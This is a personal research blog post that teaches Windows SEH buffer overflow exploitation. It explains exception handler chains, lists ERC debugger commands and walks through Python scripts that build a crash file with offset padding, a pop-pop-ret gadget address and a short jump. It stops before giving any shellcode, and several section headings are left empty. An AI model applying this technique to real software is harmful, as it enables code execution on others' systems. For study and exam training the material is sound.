<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>SEH Overflows :: Research blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="What is a Structured Exception Handler (SEH)? Exception handlers are programming constructs used to catch errors in Windows applications. They catch both system level and application level errors. They commonly look like the code snippet below.
The idea is to continue coding best practices to allow applications or system events to fail gracefully.
try { // do something } else{ catch(Exception e) { // Error handling 	} } Windows has a default exception handler for when an application doesn&amp;rsquo;t implement their own handler for a certain error condition." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://thomas-byrne.co.uk/research/binaryexploitation/seh/seh-overflows/" />




<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">

  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="SEH Overflows :: Research blog">
<meta property="og:description" content="What is a SEH? When and where are they used in Windows environments? How are they exploited? All things covered in this post about SEH Overflows." />
<meta property="og:url" content="https://thomas-byrne.co.uk/research/binaryexploitation/seh/seh-overflows/" />
<meta property="og:site_name" content="SEH Overflows" />

  <meta property="og:image" content="https://thomas-byrne.co.uk/.">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-07-10 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    /home
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/hackthebox">HackTheBox</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/oscp">OSCP</a></li>
              
            
              
                <li><a href="/projects">Projects</a></li>
              
            
              
                <li><a href="/research">Research</a></li>
              
            
              
                <li><a href="/showcase">Showcase</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/hackthebox">HackTheBox</a></li>
      
    
      
        <li><a href="/oscp">OSCP</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
      
        <li><a href="/research">Research</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://thomas-byrne.co.uk/research/binaryexploitation/seh/seh-overflows/">SEH Overflows</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-07-10 
      </span>
    
    
    <span class="post-author">:: Tom</span>
    
  </div>

  

  
    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="SEH Overflows" />
  

  

  <div class="post-content"><div>
        <h1 id="what-is-a-structured-exception-handler-seh">What is a Structured Exception Handler (SEH)?<a href="#what-is-a-structured-exception-handler-seh" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Exception handlers are programming constructs used to catch errors in Windows applications. They catch both system level and application level errors. They commonly look like the code snippet below.</p>
<p>The idea is to continue coding best practices to allow applications or system events to fail gracefully.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">try
{
<span style="color:#75715e">// do something
</span><span style="color:#75715e"></span>}
<span style="color:#66d9ef">else</span>{
catch(Exception e)
	{
<span style="color:#75715e">// Error handling
</span><span style="color:#75715e"></span>	}
}

</code></pre></div><p>Windows has a default exception handler for when an application doesn&rsquo;t implement their own handler for a certain error condition. An SEH error typically looks something like the one below</p>
<p><img src="/images/windowsCrash.png" alt="windowsCrash"></p>
<h1 id="seh-chains">SEH Chains<a href="#seh-chains" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Exception handlers are stored into a linked list to form an SEH chain. When an application crashes it traverses this linked list to find an appropriate exception handler.</p>
<p>Each item in this linked list is known as an SEH record. The first record points to the next SEH record and the second record points to the current SEH records exception handler</p>
<p><img src="/images/seh.png" alt="seh"></p>
<p>The way this works is instead of allowing the program to crash, the program will point to somewhere in memory that handles a function which prints an error box to the screen and clears memory.</p>
<h1 id="erc">ERC<a href="#erc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p><strong>Quick Command reference</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ERC --help

ERC --config SetWorkingDirectory C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\Y</span>ourUserName<span style="color:#ae81ff">\D</span>irectoryYouWillBeWorkingFrom

ERC --pattern c <span style="color:#ae81ff">3000</span>

ERC --FindNRP &lt;-- Find offset

ERC --bytearray &lt;-- create byte array payload to find bad chracters
ERC --bytearray -bytes 0x000x0A0x0D &lt;-- Ommit bad chars

ERC --compare &lt;ESP Address&gt; C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\D</span>ev1<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\E</span>RCWorkingDir<span style="color:#ae81ff">\B</span>yteArray_13.bin

ERC --SEH &lt;-- Displays a list of addresses <span style="color:#66d9ef">for</span> pop pop ret instructions
</code></pre></div><h1 id="preventing-seh-exploits">Preventing SEH exploits<a href="#preventing-seh-exploits" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Use /SAFESEH compiler flag. The linker will build a list of safe SEH event handler pointers into a table. 64 bit applications do this automatically so are not vulnerable to SEH exploits.</p>
<h1 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h2 id="crashing-the-application">Crashing the application<a href="#crashing-the-application" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h2 id="testing-for-control-of-seh-pointers">Testing for control of SEH pointers<a href="#testing-for-control-of-seh-pointers" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h2 id="finding-the-offset">Finding the offset<a href="#finding-the-offset" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h2 id="controlling-seh-pointers">Controlling SEH pointers<a href="#controlling-seh-pointers" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Now we know the offset we can implement start to understand  the SEH pointers and which one we control first.</p>
<p>By inserting different bytes after the offset it becomes clear which pointer it is we are controlling</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
file1 <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;exploit2.txt&#34;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>)

totalLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>
buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1008</span>				<span style="color:#f92672">&lt;--</span> Fuzz to SEH offset
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x41\x41\x41</span><span style="color:#e6db74">&#34;</span>		<span style="color:#75715e"># Current event handler</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x42\x42\x42\x42</span><span style="color:#e6db74">&#34;</span>		<span style="color:#75715e"># Next SEH record</span>

buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(totalLen <span style="color:#f92672">-</span> len(buf))

file1<span style="color:#f92672">.</span>write(buf)
file1<span style="color:#f92672">.</span>close()

</code></pre></div><p><img src="/images/overflow1.png" alt="Overflow"></p>
<p>This shows us that we have control over the pointer to the current exception handler and the pointer to the next SEH record. In order to redirect execution flow we need to alter the pointer to the current exception handler because this is how SEH handles execution flow and is able to execute functions to fail gracefully. Essentially we are treating this pointer as the IP if we were doing a normal buffer overflow. Because the pointer to the next SEH record sits directly before the pointer to the current exception handler we need to control this pointer before we can redirect execution flow.</p>
<p>This can be seen in the screenshot above. Our x42s have overwritten the value for the pointer to the next record and our x41s have overwritten the pointer to the current event handler. This explains why the x41s are in the &ldquo;Address&rdquo; field, the current event handler pointer is trying to point to the address we have provided (&ldquo;x41&rdquo;*4).</p>
<p>Using <code>ERC -SEH</code> we can find a <code>pop;pop;ret</code> instruction. We need to look for one with ASLR, DEP, Rebase and SafeSEH disabled.</p>
<p><img src="/images/gadgetAddr.png" alt="GadgetAddress"></p>
<p>The reason we need this specific instruction set in place of the current SEH record is because it will prevent the application from crashing, while returning execution to the top of the stack, ready to point to the current event handler. If we didn&rsquo;t pop 8 bytes off the stack it would not return execution to the correct place. Alternatively if we didnt provide this instruction set in the first place the application would just crash and never return to the current event handler.</p>
<p>By providing a valid address for the IP to point to the application doesn&rsquo;t crash and then execution returns to where we want it, which is the top of the stack.</p>
<p>I chose <code>0x6e7d4bec</code> as my pointer but it doesn&rsquo;t really matter which you chose as long as all the above protections are disabled.</p>
<p>By setting a breakpoint at this address we will be able to monitor the affect.</p>
<p>Updating our code to reflect these changes we can generate a new payload to pass to the application</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">file1 <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;exploit2.txt&#34;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>)

totalLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>
buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1008</span>				<span style="color:#f92672">&lt;--</span> Fuzz to SEH offset
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x41\x41\x41</span><span style="color:#e6db74">&#34;</span>		<span style="color:#75715e"># Current event handler</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xec\x4b\x7d\x6e</span><span style="color:#e6db74">&#34;</span> 		<span style="color:#75715e"># Next SEH record</span>

buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(totalLen <span style="color:#f92672">-</span> len(buf))

file1<span style="color:#f92672">.</span>write(buf)
file1<span style="color:#f92672">.</span>close()
</code></pre></div><p>Running the application we can see the program breaks when then EIP is pointing to our address we specified in our payload. Looking at the assembly view we can see the pop pop ret instructions about to be executed.</p>
<p><img src="/images/topOfSStack.png" alt="topOfStack"></p>
<p>Stepping into these instructions we can see we land at our <code>\x41</code> values, the address the current event handler is pointing too.</p>
<p><img src="/images/41values.png" alt="View of stack 41 values"></p>
<h2 id="code-execution">Code execution<a href="#code-execution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>In order to get code execution we have to be able to point the current event handler to an area of memory we control. Currently we can alter the values of both pointers for the SEH record and the exception handler. By looking at our debugger when we land in the current handler there are some random instructions in between our current location and an area of memory we control as evidenced by the trail of &ldquo;\x43&rdquo; values.</p>
<p><img src="/images/viewOfjunk.png" alt="View of junk on stack"></p>
<p>We can generate some opcodes to perform this jump for us using the <code>ERC -Assemble jmp 0013</code> command</p>
<p><img src="/images/generateJmpASM.png" alt="generateJmpASM"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">file1 <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;exploit2.txt&#34;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>)

totalLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>
buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1008</span>				<span style="color:#f92672">&lt;--</span> Fuzz to SEH offset
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xEB\x0B\x90\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># Current event handler</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xec\x4b\x7d\x6e</span><span style="color:#e6db74">&#34;</span> 		<span style="color:#75715e"># Next SEH record</span>

buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(totalLen <span style="color:#f92672">-</span> len(buf))

file1<span style="color:#f92672">.</span>write(buf)
file1<span style="color:#f92672">.</span>close()
</code></pre></div><p>Running the application once again and passing it our newly generated payload we can see once execution returns to the top of the stack after the <code>pop;pip;ret</code> instruction set, the IP now points to a jmp instruction. We specified a jmp instruction of 13 bytes so it will now jmp over the bad instructions and into the area of memory we control.</p>
<p><img src="/images/jumpOverJunk.png" alt="jumpOverJunk"></p>
<p>By replacing our <code>\x43</code> bytes with a nop slep, we can slide into our shell code to gain code execution.</p>

      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>





  
</div>

</body>
</html>
